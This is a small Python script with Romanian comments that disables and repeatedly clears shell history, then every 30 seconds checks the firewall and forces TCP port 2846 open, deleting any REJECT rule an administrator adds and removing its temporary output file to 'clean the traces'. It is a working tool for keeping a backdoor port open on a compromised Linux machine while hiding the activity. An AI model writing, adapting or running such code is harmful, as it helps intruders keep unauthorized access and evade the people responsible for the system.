#! /usr/bin/env python
# cmiN

import os
from time import sleep

def main():
    # toate liniile sunt puse cu cap, daca modifici ceva anunta-ma :]
    os.system("unset HISTFILE")
    os.system("unset HISTLOG")
    os.system("unset HISTSAVE")
    while True: # loop infinit -> odata la 30 secunde este chemata functia process
        process()
        os.system("history -c")
        sleep(30)
        
def process():
    os.system("iptables -L > /tmp/output.txt") # se creeaza output-ul
    fobj = open("/tmp/output.txt", "rt") # se creeaza obiectul pentru manipularea output-ului
    lines = fobj.readlines() # se returneaza in 'lines' lista cu liniile din output
    fobj.close()
    os.system("rm -rf /tmp/output.txt") # se curata urmele
    status = True # daca ramane 'True' se adauga regula
    for line in lines: # pentru fiecare linie din lista cu linii se prelucreaza linia respectiva
        if line.find("tcp dpt:2846") != -1: # a gasit regula care ne intereseaza, acum verifica daca accepta sau refuza
            if line.find("ACCEPT") == -1: # NU a gasit substring-ul 'ACCEPT', deci e clar: regula e refuzata
                os.system("iptables -D INPUT -p tcp --dport 2846 -j REJECT") # ... si atunci e stearsa
            else:
                status = False # a gasit substring-ul 'ACCEPT', deci regula e acceptata asa ca se schimba status-ul
    if status:
        os.system("iptables -I INPUT -p tcp --dport 2846 -j ACCEPT")

if __name__ == "__main__": # daca script-ul este executat si nu inclus in namespace / importat (import script)
    main()
